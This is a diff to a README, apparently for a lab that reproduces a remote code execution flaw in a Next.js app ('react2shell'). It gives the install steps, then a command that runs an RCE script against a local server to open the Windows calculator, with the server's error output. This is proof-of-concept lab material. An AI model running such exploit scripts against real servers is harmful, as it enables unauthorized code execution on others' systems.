@@ -42,15 +42,21 @@ npm install --prefix ./app/react2shell next@15.2.2
 ```sh
 # run app
 npm run dev --prefix ./app/react2shell
+```
 
-# Exploit vulnerability: test on windows open calculator
+![app_home_page](./img/app_home_page.png)
+
+- Exploit vulnerability: launch calculator in windows
+
+```sh
+# test on windows open calculator
 python ./scripts/rce.py http://localhost:3000 calc
 # 500
 # 0:{"a":"$@1","f":"","b":"development"}
 # 1:E{"digest":"712750234","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server"}
 ```
 
-> launch calculator in windows
+![app_exploit_cal](./img/app_exploit_cal.png)
 
 ---
 
